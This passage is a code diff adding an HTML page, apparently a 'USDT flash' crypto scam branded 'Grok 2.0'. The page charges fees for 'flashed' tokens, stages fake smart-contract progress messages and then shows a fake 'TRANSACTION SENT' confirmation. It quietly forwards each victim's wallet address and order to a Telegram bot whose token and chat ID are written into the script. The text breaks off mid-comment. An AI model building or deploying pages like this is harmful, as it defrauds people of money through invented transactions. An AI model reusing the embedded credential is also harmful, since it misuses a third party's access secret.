@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Grok 2.0 Secure Transaction</title>
+<style>
+  /* --- 1. CORE COLOR SCHEME (High Contrast Dark Mode) --- */
+  :root {
+    --primary-accent: #FFFFFF;     
+    --secondary-accent: #0A84FF;   
+    --dark-bg: #000000;           
+    --card-bg: #1C1C1E;           
+    --input-bg: #1F1F1F;          
+    --success-color: #34C759;     
+    --error-color: #FF3B30;       
+  }
+
+  /* Base Styles */
+  * {
+    box-sizing: border-box;
+    font-family: 'Inter', sans-serif; 
+    transition: all 0.3s ease-in-out; 
+  }
+  html, body {
+    margin: 0; 
+    padding: 0;
+    min-height: 100vh;
+    height: auto; 
+    background: var(--dark-bg); 
+    color: var(--primary-accent);
+    overflow-x: hidden; 
+    overflow-y: scroll; 
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-start; 
+    align-items: center;
+    padding-top:1rem;
+    padding-bottom: 30px; 
+  }
+  
+  /* إخفاء شريط التمرير */
+  body::-webkit-scrollbar { display: none; }
+  body { -ms-overflow-style: none; scrollbar-width: none; }
+
+
+  /* --- 💡 NEW: WELCOME MODAL STYLES --- */
+  .modal-overlay {
+    /* تغطية الشاشة بالكامل */
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.95); /* خلفية شبه شفافة داكنة جداً */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999; /* أعلى طبقة */
+    backdrop-filter: blur(5px);
+  }
+
+  .modal-content {
+    background-color: var(--card-bg);
+    padding: 30px 40px;
+    border-radius: 20px;
+    text-align: center;
+    max-width: 320px;
+    box-shadow: 0 0 50px rgba(10, 132, 255, 0.5); /* ظل نيون أزرق */
+    border: 1px solid rgba(10, 132, 255, 0.2);
+    animation: fadeIn 0.5s ease-out;
+  }
+
+  @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+  }
+
+  .modal-content h2 {
+    font-size: 1.8rem;
+    color: var(--secondary-accent);
+    margin-bottom: 10px;
+    font-weight: 900;
+  }
+
+  .modal-content p {
+    font-size: 0.95rem;
+    color: #AAA;
+    margin-bottom: 30px;
+    font-style: italic;
+  }
+
+  #modal-enter-button {
+    padding: 12px 30px;
+    background-color: var(--success-color);
+    color: var(--dark-bg);
+    border: none;
+    border-radius: 10px;
+    font-size: 1.1rem;
+    font-weight: 700;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(52, 199, 89, 0.4);
+    transform: scale(1);
+  }
+
+  #modal-enter-button:hover {
+    background-color: #40d663;
+    transform: scale(1.03);
+  }
+  /* --- END WELCOME MODAL STYLES --- */
+
+
+  /* --- 2. TOP NAVIGATION BAR --- */
+  .top-nav {
+    width: 95vw; 
+    max-width: 380px; 
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 5px; 
+    margin-top: 35px; 
+    margin-bottom: 20px; 
+  }
+  .nav-icon {
+    display: block;
+    padding: 8px; 
+    cursor: pointer;
+  }
+  
+  /* Styling for SVG Icons */
+  .nav-icon svg {
+    width: 24px;
+    height: 24px;
+    fill: var(--primary-accent); 
+  }
+
+  /* 💡 LIVE CHAT BUTTON (Dropdown Trigger) STYLE */
+  .live-chat-trigger {
+      padding: 8px 15px; 
+      background-color: var(--success-color); 
+      color: var(--dark-bg); 
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      text-decoration: none;
+      box-shadow: 0 4px 15px rgba(52, 199, 89, 0.5);
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      line-height: 1;
+      transform: scale(1);
+      border: none;
+      outline: none;
+  }
+  .live-chat-trigger:hover, .live-chat-trigger:focus {
+      background-color: #40d663; 
+      box-shadow: 0 4px 20px rgba(52, 199, 89, 0.8);
+      transform: scale(1.02);
+  }
+  
+  .live-chat-trigger .live-indicator {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      background-color: var(--error-color); 
+      border-radius: 50%;
+      margin-left: 5px;
+      margin-right: -2px;
+      animation: pulse 1.5s infinite; 
+  }
+  
+  @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(255, 59, 48, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); }
+  }
+
+
+  /* Dropdown Menu (Right side) */
+  .dropdown {
+      position: relative;
+      display: inline-block;
+  }
+  .dropdown-content {
+      display: none;
+      position: absolute;
+      right: 0;
+      top: 45px; 
+      background-color: var(--card-bg); 
+      min-width: 180px;
+      border-radius: 10px;
+      box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.5);
+      z-index: 20; 
+      overflow: hidden;
+  }
+  .dropdown-content a {
+      color: var(--primary-accent);
+      padding: 12px 16px;
+      text-decoration: none;
+      display: block;
+      font-size: 0.9rem;
+      font-weight: 500;
+  }
+  .dropdown-content a:hover, .dropdown-content a:focus {
+      background-color: #333; 
+  }
+  /* Class to show the dropdown menu */
+  .dropdown-show .dropdown-content {
+      display: block;
+  }
+
+  /* --- 3. FLOATING ACTION BUTTON (FAB) --- */
+  .fab-container {
+      position: fixed;
+      bottom: 20px; 
+      right: 20px;  
+      left: auto;
+      z-index: 30;
+      padding: 0;
+      margin: 0;
+  }
+  .fab-button {
+      width: 70px; 
+      height: 70px; 
+      border-radius: 50%; 
+      background-color: var(--secondary-accent); 
+      box-shadow: 0 4px 15px rgba(10, 132, 255, 0.6); 
+      border: none;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      transform: none; 
+      transition: all 0.3s ease-in-out;
+  }
+  .fab-button:hover, .fab-button:focus {
+      transform: scale(1.05); 
+      box-shadow: 0 4px 20px rgba(10, 132, 255, 0.9);
+  }
+
+  .fab-button svg {
+      width: 26px; 
+      height: 26px;
+      fill: var(--primary-accent);
+      filter: drop-shadow(0 0 4px var(--primary-accent));
+      margin-bottom: 0px; 
+      transform: none;
+  }
+  
+  .fab-text {
+      font-size: 0.65rem; 
+      font-weight: 600;
+      color: var(--primary-accent);
+      text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
+      line-height: 1.1; 
+  }
+
+
+  /* --- مؤشر التحميل (Spinner CSS) --- */
+  .spinner {
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid var(--primary-accent);
+      border-radius: 50%;
+      width: 18px; 
+      height: 18px; 
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      margin-right: 10px;
+      vertical-align: middle;
+  }
+  @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+  }
+
+  /* --- App Header (GROK 2.0 + Logo) --- */
+  .app-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      max-width: 350px;
+      margin-bottom: 20px; 
+      padding: 10px 0;
+  }
+  .app-header img {
+      width: 40px; 
+      height: 40px;
+      border-radius: 50%; 
+      margin-right: 15px; 
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); 
+  }
+  .app-header h1 {
+      font-size: 2.5rem; 
+      font-weight: 900;
+      color: var(--secondary-accent);
+      margin: 0;
+      letter-spacing: -0.08em; 
+  }
+  
+  /* Container (The main form card) */
+  .container {
+    width: 90vw;
+    max-width: 350px;
+    background: var(--dark-bg); 
+    border-radius: 20px;
+    padding: 25px 20px;
+    box-shadow: 0 0 40px rgba(0, 0, 0, 0.8), inset 0 0 5px rgba(255, 255, 255, 0.05); 
+    text-align: left;
+    margin: 0; 
+    z-index: 10;
+  }
+
+  /* Input and Label Styles */
+  label {
+    font-size: 0.9rem;
+    margin-bottom: 8px; 
+    display: block; 
+    color: #CCC;
+    font-weight: 500;
+  }
+  select, input[type="text"], input[readonly] {
+    width: 100%;
+    padding: 16px; 
+    margin-bottom: 20px;
+    font-size: 1rem;
+    border-radius: 14px; 
+    border: 1px solid var(--input-bg);
+    background: var(--input-bg); 
+    color: var(--primary-accent);
+    box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.6); 
+    -webkit-appearance: none; 
+    appearance: none;
+  }
+  /* Dropdown arrow for select */
+  select {
+    background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22white%22%3E%3Cpath%20d%3D%22M5.293%207.293a1%201%200%20011.414%200L10%2010.586l3.293-3.293a1%201%200%20111.414%201.414l-4%204a1%201%200%2001-1.414%200l-4-4a1%201%200%20010-1.414z%22%20clip-rule%3D%22evenodd%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E");
+    background-repeat: no-repeat;
+    background-position: right 15px center;
+    background-size: 15px;
+  }
+  input[type="text"]:focus, select:focus {
+    outline: none;
+    border-color: var(--secondary-accent);
+    box-shadow: 0 0 8px rgba(10, 132, 255, 0.6), inset 0 2px 5px rgba(0, 0, 0, 0.6); 
+  }
+  input[readonly] {
+    opacity: 0.8;
+  }
+  
+  /* Network Buttons */
+  .network-options {
+    display: flex;
+    justify-content: space-between;
+    gap: 8px; 
+    margin-bottom: 30px;
+    border-radius: 14px;
+    padding: 6px;
+    background: var(--input-bg); 
+    box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.6);
+  }
+  .network-options input[type="radio"] { display: none; }
+  .network-options label[role="radio"] {
+      flex-grow: 1;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 60px; 
+      padding: 8px;
+      font-size: 0.85rem;
+      border-radius: 12px;
+      cursor: pointer;
+      background: transparent;
+      color: #999;
+      transition: all 0.2s ease-in-out;
+  }
+  .network-options input[type="radio"]:checked + label[role="radio"] {
+      background: var(--secondary-accent); 
+      color: var(--primary-accent); 
+      font-weight: 700;
+      box-shadow: 0 4px 15px rgba(10, 132, 255, 0.4); 
+  }
+  .network-options label[role="radio"]:active { transform: scale(0.97); }
+  .network-options img {
+      height: 24px; 
+      width: 24px;
+      margin-bottom: 4px;
+      filter: grayscale(100%) opacity(0.8); 
+      transition: filter 0.2s;
+  }
+  .network-options input[type="radio"]:checked + label[role="radio"] img {
+      filter: grayscale(0%) opacity(1);
+  }
+
+  /* NEXT/SEND ORDER Button - MODIFIED FOR "CUT-OUT" EFFECT */
+  #btn-next {
+      padding: 18px 20px;
+      margin-top: 30px;
+      width: 100%;
+      font-size: 1.25rem; 
+      border-radius: 18px;
+      border: none;
+      background-color: var(--secondary-accent); 
+      color: var(--primary-accent); 
+      font-weight: 700;
+      cursor: pointer;
+      /* 💡 تأثير القطع الناعم (Soft Inset / Multi-Shadow) */
+      box-shadow: 
+          /* ظل نيون أزرق خارجي */
+          0 4px 20px rgba(10, 132, 255, 0.5), 
+          /* ظل داخلي علوي ناعم (لإعطاء تأثير القطع) */
+          inset 0 4px 6px rgba(0, 0, 0, 0.8),
+          /* ظل داخلي سفلي ناعم (لإعطاء تأثير القطع) */
+          inset 0 -2px 4px rgba(255, 255, 255, 0.2); 
+      
+      /* إضافة خلفية (محاكاة لصور القطع و bt.png) */
+      background-image: linear-gradient(rgba(255,255,255,0.05), rgba(0,0,0,0.1));
+      background-size: cover; 
+  }
+  
+  #btn-next:hover:not(:disabled) {
+      box-shadow: 
+          0 4px 25px rgba(10, 132, 255, 0.8),
+          inset 0 4px 6px rgba(0, 0, 0, 0.8),
+          inset 0 -2px 4px rgba(255, 255, 255, 0.2); 
+      transform: translateY(-1px);
+  }
+  
+  #btn-next:disabled {
+      background-color: #333; 
+      color: #777;
+      box-shadow: none;
+      cursor: not-allowed;
+      background-image: none; 
+  }
+
+  /* Status Messages */
+  #message {
+    padding: 8px 0;
+    font-size: 0.95rem; 
+    min-height: 20px;
+    margin-top: 15px;
+  }
+  
+  /* Media Query for small screens */
+  @media (max-width: 350px) {
+    .app-header h1 { font-size: 2.1rem; }
+    .app-header img { width: 35px; height: 35px; margin-right: 10px; }
+    .container { padding: 20px 15px; }
+    select, input[type="text"], input[readonly] { padding: 14px; font-size: 0.95rem; }
+    #btn-next { font-size: 1.1rem; padding: 16px; }
+    .network-options label[role="radio"] { font-size: 0.8rem; height: 55px; }
+  }
+
+</style>
+</head>
+<body>
+
+<div class="modal-overlay" id="welcomeModal">
+  <div class="modal-content">
+    <h2>WELCOME TO GROK 2.0</h2>
+    <p>where usdt flash is available for everyone</p>
+    <button id="modal-enter-button" onclick="closeModalAndPlayMusic()">ENTER</button>
+  </div>
+</div>
+<div class="top-nav">
+  <a href="settings.html" class="nav-icon" aria-label="Settings" onclick="playBeep()">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+        <path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.38-1.07-.73-1.69-.99l-.38-2.65C14.46 2.18 14.16 2 13.84 2h-2c-.32 0-.62.18-.73.46l-.38 2.65c-.62.26-1.17.61-1.69.99l-2.49-1c-.22-.09-.49 0-.61.22l-2 3.46c-.12.22-.07.49.12.64l2.11 1.65c-.04.32-.07.64-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.38 1.07.73 1.69.99l.38 2.65c.11.28.41.46.73.46h2c.32 0 .62-.18.73-.46l.38-2.65c.62-.26 1.17-.61 1.69-.99l2.49 1c.22.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zm-7.43-2.98c1.38 0 2.5 1.12 2.5 2.5s-1.12 2.5-2.5 2.5-2.5-1.12-2.5-2.5 1.12-2.5 2.5-2.5z"/>
+    </svg>
+  </a>
+
+  <div class="dropdown" id="myDropdownContainer">
+    <button class="live-chat-trigger" onclick="toggleDropdown(); playBeep();" aria-haspopup="true" aria-expanded="false" aria-label="Menu">
+        LIVE
+        <span class="live-indicator"></span>
+    </button>
+    
+    <div class="dropdown-content" id="myDropdown">
+      <a href="chat.html" onclick="playBeep()">Live Chat</a>
+      <a href="platforms.html" onclick="playBeep()">Supported Platforms</a>
+      <a href="history.html" onclick="playBeep()">History</a>
+    </div>
+  </div>
+</div>
+
+<div class="app-header">
+    <img src="logo.png" alt="Grok 2.0 Logo" onerror="this.onerror=null; this.src='https://placehold.co/40x40/FFFFFF/000000?text=G';" />
+    <h1>GROK 2.0</h1>
+</div>
+
+
+<div class="container" role="main" aria-label="Grok 2.0 Transaction form">
+  
+  <label for="amount">Flash Amount (USDT)</label>
+  <select id="amount" onchange="updatePrice(); playBeep()">
+    <option value="10">500 USDT </option>
+    <option value="25">1500 USDT </option>
+    <option value="50">3500 USDT </option>
+    <option value="120">9000 USDT </option>
+  </select>
+
+  <label for="wallet-address">Wallet Address</label>
+  <input type="text" id="wallet-address" placeholder="Enter your TRC20 or BEP20 address" aria-required="true" oninput="checkAddressAndNetwork(this.value)" />
+
+  <label id="network-label">Flash Network</label>
+  <div class="network-options" role="radiogroup" aria-labelledby="network-label">
+    
+    <input type="radio" name="network" id="trc" value="TRC20" disabled />
+    <label for="trc" role="radio" tabindex="0" onclick="playBeep()">
+      <img src="tron.png" alt="TRC20 logo" onerror="this.onerror=null; this.src='https://placehold.co/24x24/0A84FF/000?text=T';" /> TRC20
+    </label>
+
+    <input type="radio" name="network" id="bep" value="BEP20" disabled />
+    <label for="bep" role="radio" tabindex="0" onclick="playBeep()">
+      <img src="bep20.png" alt="BEP20 logo" onerror="this.onerror=null; this.src='https://placehold.co/24x24/FCDD24/000?text=B';" /> BEP20
+    </label>
+  </div>
+
+  <label for="price">Service Fees (USD)</label>
+  <input type="text" id="price" readonly value="$10" aria-readonly="true" />
+
+  <button id="btn-next" onclick="startSubmission(); playBeep();" disabled>ENTER WALLET ADDRESS</button>
+
+  <div id="message" role="alert" aria-live="assertive"></div>
+</div>
+
+<div class="fab-container">
+    <a href="profil.html" class="fab-button" aria-label="Contact Support" onclick="playBeep()">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10zm-8-7L4 6h16l-8 5z"/>
+        </svg>
+        <span class="fab-text">Contact Me</span>
+    </a>
+</div>
+
+
+<script>
+  // --- AUDIO FEEDBACK IMPLEMENTATION (bip.mp3 Sound and space.mp3 Music) ---
+  let audioBeep = null;
+  let audioSpaceMusic = null;
+
+  // تهيئة عناصر الصوت مرة واحدة
+  function initializeAudio() {
+    if (!audioBeep) {
+      try {
+        audioBeep = new Audio('bip.mp3');
+        audioBeep.preload = 'auto'; 
+        audioBeep.onerror = () => console.error("Failed to load bip.mp3.");
+      } catch (e) {
+        console.error("Audio element (bip) creation failed:", e);
+      }
+    }
+    
+    // Initialize space music only once
+    if (!audioSpaceMusic) {
+      try {
+        audioSpaceMusic = new Audio('space.mp3');
+        audioSpaceMusic.loop = true; // Set to loop
+        audioSpaceMusic.volume = 0.4; // Set a lower volume for background music
+        audioSpaceMusic.preload = 'auto';
+        audioSpaceMusic.onerror = () => console.error("Failed to load space.mp3.");
+      } catch (e) {
+        console.error("Audio element (space) creation failed:", e);
+      }
+    }
+  }
+  
+  // Call initialize on page load
+  document.addEventListener('DOMContentLoaded', initializeAudio);
+
+  function playBeep() {
+    if (audioBeep) {
+      audioBeep.currentTime = 0; 
+      audioBeep.play().catch(error => {
+          // Playback failed (e.g., policy issue, but we try anyway)
+          console.error("Beep playback failed:", error);
+      });
+    }
+  }
+  
+  // وظيفة تشغيل الموسيقى
+  function playSpaceMusic() {
+    if (audioSpaceMusic) {
+        // إعادة تعيين الوقت والتشغيل لضمان بدء التشغيل
+        audioSpaceMusic.currentTime = 0;
+        audioSpaceMusic.play()
+            .then(() => {
+                console.log("Space music started successfully.");
+            })
+            .catch(error => {
+                // هذا يحدث عادةً إذا كان هناك خطأ في تحميل الملف أو إذا كان المتصفح يمنع التشغيل
+                console.error("Space music playback failed. Error:", error);
+            });
+    } else {
+        console.error("Space music audio element is null.");
+    }
+  }
+
+  // --- MODAL AND MUSIC CONTROL ---
+  function closeModalAndPlayMusic() {
+      const modal = document.getElementById('welcomeModal');
+      
+      // 1. Hide the modal (Visual effect)
+      modal.style.opacity = '0';
+      setTimeout(() => {
+          modal.style.display = 'none';
+      }, 500); // Wait for CSS transition to finish
+
+      // 2. Play the space music (Triggered by user interaction)
+      playSpaceMusic();
+
+      // 3. Play the beep for the button click
+      playBeep();
+  }
+
+
+  // JavaScript for Dropdown Functionality
+  function toggleDropdown() {
+      document.getElementById("myDropdownContainer").classList.toggle("dropdown-show");
+  }
+
+  // Close the dropdown if the user clicks outside of it
+  window.onclick = function(event) {
+    if (!event.target.closest('.dropdown')) {
+      const dropdowns = document.getElementsByClassName("dropdown");
+      for (let i = 0; i < dropdowns.length; i++) {
+        const openDropdown = dropdowns[i];
+        if (openDropdown.classList.contains('dropdown-show')) {
+          openDropdown.classList.remove('dropdown-show');
+        }
+      }
+    }
+  }
+
+
+  // Global flag to prevent re-submission while loading
+  let isSubmitting = false;
+  let loadingInterval = null;
+
+  // Function to update the service fee based on selected amount
+  function updatePrice() {
+    const amount = document.getElementById("amount").value;
+    document.getElementById("price").value = "$" + amount;
+  }
+  
+  // 1. Function to check address, enable network, and enable the main button
+  function checkAddressAndNetwork(walletAddress) {
+    const trimmedAddress = walletAddress.trim();
+    const trc = document.getElementById('trc');
+    const bep = document.getElementById('bep');
+    const nextButton = document.getElementById("btn-next");
+    const messageBox = document.getElementById("message");
+
+    // Reset buttons and state
+    trc.disabled = true; trc.checked = false;
+    bep.disabled = true; bep.checked = false;
+    
+    // Default button state
+    nextButton.disabled = true;
+    nextButton.innerHTML = "ENTER WALLET ADDRESS"; 
+    
+    messageBox.innerHTML = '';
+    messageBox.style.color = '#fff';
+    
+    // If input is empty, reset and return
+    if (trimmedAddress.length === 0) {
+        return; 
+    }
+    
+    // Regular expressions for validation
+    const bep20Regex = /^0x[a-fA-F0-9]{40}$/i;
+    const trc20Regex = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
+
+    let detectedNetwork = null;
+    
+    if (bep20Regex.test(trimmedAddress)) {
+      detectedNetwork = 'BEP20';
+    } else if (trc20Regex.test(trimmedAddress)) {
+      detectedNetwork = 'TRC20';
+    }
+
+    if (detectedNetwork) {
+        // Enable and check the correct radio button
+        const radioToSelect = document.getElementById(detectedNetwork === 'TRC20' ? 'trc' : 'bep');
+        if (radioToSelect) {
+            radioToSelect.disabled = false;
+            radioToSelect.checked = true;
+        }
+        
+        // Validation success
+        nextButton.disabled = false;
+        // سيتم تطبيق الألوان الزرقاء والظل من CSS الآن
+        nextButton.innerHTML = `<span class="btn-icon">&#x27A4;</span>SEND ORDER`;
+        messageBox.style.color = 'var(--secondary-accent)';
+        messageBox.textContent = `Address detected as ${detectedNetwork}. Click SEND ORDER to proceed.`;
+    } else if (trimmedAddress.length > 30) {
+        // Show error for long, invalid addresses (addresses are typically 34 or 42 chars)
+        messageBox.style.color = 'var(--error-color)';
+        messageBox.textContent = "Invalid address format. Only TRC20 (starts with 'T') or BEP20 (starts with '0x') supported.";
+    }
+  }
+
+  // 2. The primary button handler (Phase 2: Sending)
+  function startSubmission() {
+    if (isSubmitting) return;
+
+    const walletAddressInput = document.getElementById("wallet-address");
+    const walletAddress = walletAddressInput.value.trim();
+    const messageBox = document.getElementById("message");
+    const nextButton = document.getElementById("btn-next");
+    const amount = document.getElementById("amount").value; 
+    const selectedNetwork = document.querySelector('input[name="network"]:checked');
+
+    // Security check to ensure the state is valid before submission
+    if (!selectedNetwork || !walletAddress || nextButton.textContent.indexOf("SEND ORDER") === -1) {
+        checkAddressAndNetwork(walletAddress); 
+        messageBox.style.color = 'var(--error-color)';
+        messageBox.textContent = "Please enter a valid wallet address.";
+        return;
+    }
+    
+    // --- Start 6-Second Submission Sequence (Connect/Checking) ---
+    isSubmitting = true; 
+    walletAddressInput.readOnly = true;
+    nextButton.disabled = true;
+    
+    messageBox.innerHTML = ''; 
+    
+    // Disable network buttons during submission loading
+    document.getElementById('trc').disabled = true;
+    document.getElementById('bep').disabled = true;
+
+    const messages = [
+      "CONNECTING TO SMART CONTRACT...", // 0s - 2s
+      "CHECKING WALLET ADDRESS STATUS...",    // 2s - 4s
+      "VALIDATING FLASH NETWORK..."     // 4s - 6s
+    ];
+    let step = 0;
+    
+    // Function to update the message with the spinner (INSIDE THE BUTTON)
+    const updateMessage = () => {
+      if (step < messages.length) {
+        // Use the new spinner class
+        nextButton.innerHTML = `<span class="spinner"></span>${messages[step]}`;
+        step++;
+      } else {
+        clearInterval(loadingInterval);
+      }
+    };
+    
+    // Initial message and start interval
+    updateMessage();
+    loadingInterval = setInterval(updateMessage, 2000); 
+
+    // Final action after 6 seconds (end of loading)
+    setTimeout(() => {
+      clearInterval(loadingInterval);
+      
+      // Proceed to send to Telegram
+      sendToTelegram(amount, selectedNetwork.value, walletAddress, messageBox, nextButton);
+
+    }, 6000); 
+  }
+
+  // 3. Helper function to handle the Telegram API submission
+  function sendToTelegram(amount, network, walletAddress, messageBox, nextButton) {
+    // Set a simple waiting status in the button before fetch
+    nextButton.innerHTML = `<span class="spinner"></span>FINALIZING SUBMISSION...`;
+    
+    // **NOTE: Using hardcoded Telegram Bot Token and Chat ID from the original code**
+    const botToken = "8385960576:AAFZ_L4tpFbAHlMCebdXyX20XG5ZGgWBRRg";
+    const chatId = "8066634898";
+    
+    const usdtAmount = document.getElementById("amount").options[document.getElementById("amount").selectedIndex].text.split(' ')[0];
+    const feeAmount = `$${amount}`;
+
+    const message = `⚡️ NEW FLASH ORDER ⚡️\n---
+USDT Amount: ${usdtAmount}
+Service Fee: ${feeAmount}
+Network: ${network}
+Wallet: ${walletAddress}
+---`;
+    
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).then(response => {
+      isSubmitting = false;
+      document.getElementById("wallet-address").readOnly = false; 
+      
+      if (!response.ok) throw new Error('Telegram API failed to send');
+      
+      // Update final status to success (Green)
+      nextButton.innerHTML = `<span style="color:var(--dark-bg); margin-right: 8px;">&#x2714;</span> TRANSACTION SENT`; 
+      nextButton.disabled = true;
+      nextButton.style.backgroundColor = 'var(--success-color)';
+      nextButton.style.boxShadow = '0 0 15px rgba(52, 199, 89, 0.5)';
+      nextButton.style.color = 'var(--dark-bg)';
+      
+      messageBox.style.color = 'var(--success-color)'; 
+      messageBox.textContent = "Transaction request submitted successfully. Enjoy the flash!";
+      
+      document.getElementById("wallet-address").value = "";
+      
+      // Redirect to a dummy success URL after a delay
+      const randomID = Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
+      setTimeout(() => {
+        // Redirect to simulate transaction completion page
+        window.location.href = "payment.html?txid=" + randomID; 
+      }, 2000); 
+    }).catch((error) => {
+      // Error during submission
+      isSubmitting = false; 
+      document.getElementById("wallet-address").readOnly = false; 
+      console.error("Submission Error:", error);
+      
+      // Reset button and show error message
+      messageBox.textContent = "Error during transaction: Connection lost or API issue. Please try aagain.";
+      messageBox.style.color = 'var(--error-color)';
+      
+      // Re-validate to reset the button to 'SEND ORDER' state (which
